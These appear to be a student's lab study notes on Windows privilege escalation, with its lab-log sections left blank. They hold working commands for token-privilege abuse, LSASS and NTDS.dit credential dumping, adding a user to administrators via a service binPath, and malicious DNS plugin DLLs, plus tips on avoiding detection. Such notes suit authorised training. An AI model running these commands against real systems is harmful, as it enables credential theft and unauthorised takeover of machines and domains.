# Windows Privilege Escalation

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Escalate from a low-priv Windows user (or service) to SYSTEM/Administrator by abusing privileges, services, credentials and misconfigurations.

## Initial enumeration
```powershell
whoami /priv ; whoami /groups           # privileges + group SIDs (THE key check)
systeminfo ; wmic qfe                    # OS/patch level -> missing-patch exploits
set ; echo %USERNAME%
tasklist /svc ; query user
net user ; net localgroup administrators ; net accounts
ipconfig /all ; arp -a ; route print ; netstat -ano
Get-MpComputerStatus                      # Defender
Get-AppLockerPolicy -Effective | select -Expand RuleCollections
gci \\.\pipe\                             # named pipes (potato/relay targets)
accesschk.exe /accepteula \\.\Pipe\lsass -v
```
Automate with **winPEAS** / **PowerUp** (`Invoke-AllChecks`) / **Seatbelt**.

### Enumeration extras (beyond the basics above)
```powershell
schtasks /query /fo LIST /v              # scheduled tasks (writable task/script = privesc)
driverquery                              # loaded drivers (vuln driver = BYOVD / kernel)
wmic product get name                    # installed software -> known-vuln apps
Get-Service | select Name,StartType,Status   # services (feeds unquoted-path / weak-ACL checks)
# named pipes — look for writable pipes to impersonate
accesschk.exe /accepteula -w \pipe\* -v
accesschk.exe /accepteula \\.\Pipe\<pipe> -v
# listening ports (internal services for pivoting)
netstat -ano ; Get-NetTCPConnection | ? {$_.State -eq 'Listen'}
```
> Situational awareness first: know the OS/patch level, what's running, what's listening, and what defenses (Defender/AppLocker/EDR) are watching — that decides which technique won't get caught.

## Token privilege abuse (the main service->SYSTEM path)
`whoami /priv` is the first thing to read. The gold ones:
| Privilege | Abuse |
|---|---|
| **SeImpersonate / SeAssignPrimaryToken** | "potato" attacks -> SYSTEM: **PrintSpoofer**, **GodPotato**, JuicyPotato (older) |
| **SeBackup / SeRestore** | read any file -> copy SAM+SYSTEM or NTDS.dit |
| **SeTakeOwnership** | take ownership of a file/registry key -> read/replace it |
| **SeDebug** | open any process -> dump LSASS |
```text
# SeImpersonate (service accounts, IIS, MSSQL) -> SYSTEM:
PrintSpoofer.exe -i -c cmd         # -c runs a command as SYSTEM (reverse-shell payload not stored)
# GodPotato.exe -cmd "cmd /c whoami"  (modern equivalent for newer Windows)
```
Service accounts (IIS `iis apppool\...`, MSSQL via `xp_cmdshell`) almost always have SeImpersonate -> instant SYSTEM. This is the #1 Windows service-to-SYSTEM move.

### Token privileges — detail
**Privilege vs access right:** a *privilege* is a system-wide action (debug any process); an *access right* is object-specific (read this file). `whoami /priv` lists privileges — but note **a privilege can be present yet disabled**; enable all with EnableAllTokenPrivs.ps1. Detection: Event ID **4672** (special privileges assigned).

- **SeImpersonate** (web/DB service accounts): reach a shell, confirm `whoami /priv`, then potato to SYSTEM. Via MSSQL:
  ```text
  mssqlclient.py <user>@<host> -windows-auth   # enable_xp_cmdshell ; xp_cmdshell whoami /priv
  # then run PrintSpoofer/GodPotato from xp_cmdshell (-c runs a command as SYSTEM)
  ```
- **SeDebug**: open any process → dump LSASS (`procdump -ma lsass.exe lsass.dmp` → mimikatz `sekurlsa::logonpasswords`, or pypykatz offline), or spawn SYSTEM from a parent PID.
- **SeTakeOwnership**: take + re-ACL a restricted file to read it:
  ```text
  takeown /f <file>
  icacls <file> /grant <me>:F
  type <file>
  icacls <file> /reset          # revert after (reduce artifacts)
  ```
- **SeBackup/SeRestore**: backup-read any file → copy SAM+SYSTEM or NTDS.dit for offline hash extraction.

> These map one-to-one: SeImpersonate→potato, SeDebug→LSASS, SeBackup→NTDS/SAM, SeTakeOwnership→read-any-file. Reading `whoami /priv` tells you which path is open before you try anything.

## Privileged built-in group abuse
Membership in these groups (check `whoami /groups`) = a privesc path, even without being a full admin:

| Group | Abuse → outcome |
|---|---|
| **Backup Operators** (SeBackup/SeRestore) | shadow-copy the DC volume with `diskshadow`, copy **NTDS.dit** + `reg save HKLM\SYSTEM`, then `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL` → all domain hashes |
| **DnsAdmins** | load a malicious `ServerLevelPluginDll` into the DNS service (runs as SYSTEM on the DC): `dnscmd /config /serverlevelplugindll <dll>` → `sc stop dns; sc start dns`. (DLL built with msfvenom; mimilib source not stored.) Also WPAD spoofing via `Add-DnsServerResourceRecordA wpad`. |
| **Server Operators** | `SERVICE_ALL_ACCESS` on services → repoint a service binPath: `sc config <svc> binPath= "cmd /c net localgroup Administrators <me> /add"` → `sc start <svc>` → local admin |
| **Print Operators** (SeLoadDriver) | load a vulnerable signed driver (BYOVD, e.g. Capcom.sys) via registry → exploit it for SYSTEM. Needs the priv enabled (UAC bypass). |
| **Hyper-V Administrators** | clone a virtualized DC, mount its VHDX offline, extract NTDS.dit; or old hard-link service-replace (patched Mar 2020) |
| **Event Log Readers** | read the Security log for creds in process-creation (Event ID 4688) command lines: `wevtutil qe Security /f:text | findstr "/user"` or `Get-WinEvent -LogName security | ? {$_.ID -eq 4688}` |

**Backup Operators NTDS steps (the common one):**
```text
diskshadow.exe   # script: set context persistent; begin backup; add volume C: alias x; create; expose %x% E:; end backup
robocopy /B E:\Windows\NTDS\ . ntds.dit
reg save HKLM\SYSTEM SYSTEM.SAV
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

> Always run `whoami /groups`. These "weak" admin-adjacent groups (Backup Operators, DnsAdmins, Server Operators) are frequently handed out and each is a clean path to DA/SYSTEM — defenders forget they're nearly as powerful as Domain Admins.

## Credential dumping
```text
# LSASS (plaintext creds / NTLM hashes) - needs admin/SeDebug
procdump.exe -accepteula -ma lsass.exe lsass.dmp     # dump offline (quieter than mimikatz live)
# mimikatz: sekurlsa::minidump lsass.dmp  ->  sekurlsa::logonpasswords
# SAM/SYSTEM (local hashes)
reg save HKLM\SAM sam ; reg save HKLM\SYSTEM system   # secretsdump.py -sam sam -system system LOCAL
# NTDS.dit (all domain hashes, on a DC - with SeBackup or admin)
robocopy /B E:\Windows\NTDS\ ntds ntds.dit
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

## Credential hunting (files / history)
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
gc (Get-PSReadLineOption).HistorySavePath          # PowerShell history
$cred = Import-Clixml 'C:\path\pass.xml'           # saved PSCredential (reversible!)
# also: unattend.xml, web.config, saved browser creds, cmdkey /list
```

## Misc privesc vectors (more detail to come)
- **DLL hijacking** - writable dir in a service's DLL search path -> drop a malicious DLL (incl. DNS `ServerLevelPluginDll` on a DC-DNS admin -> SYSTEM).
- **ACL / takeown** on sensitive files: `takeown /f <file>` + `icacls <file> /grant <me>:F` -> read configs/creds.
- **Unquoted service paths, weak service perms, AlwaysInstallElevated** - classic service misconfigs (next sections).

> Read `whoami /priv` first, every time. **SeImpersonate -> PrintSpoofer/GodPotato -> SYSTEM** is the single most common Windows privesc, because service accounts (web/DB) have it by default.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
